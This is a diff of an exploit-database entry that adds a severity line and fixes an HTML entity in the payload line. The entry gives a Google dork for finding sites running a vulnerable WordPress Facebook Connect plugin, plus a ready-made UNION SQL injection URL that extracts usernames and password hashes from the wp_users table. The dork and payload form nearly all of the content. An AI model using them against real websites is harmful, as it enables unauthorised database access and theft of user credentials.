@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/3708
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2011-04-05
 Author:           anonymous
@@ -6,4 +7,4 @@ GoogleDork:       inurl:"fbconnect_action=myhome"
 Description:      inurl:"fbconnect_action=myhome"
 
 
-Submitter: z0mbyak SQL Injection: www.site.name/path/?fbconnect_action=myhome&amp;fbuserid=1+and+1=2+union+select+1,2,3,4,5,concat(user_login,0x3a,user_pass)z0mbyak,7,8,9,10,11,12+from+wp_users--
+Submitter: z0mbyak SQL Injection: www.site.name/path/?fbconnect_action=myhome&fbuserid=1+and+1=2+union+select+1,2,3,4,5,concat(user_login,0x3a,user_pass)z0mbyak,7,8,9,10,11,12+from+wp_users--
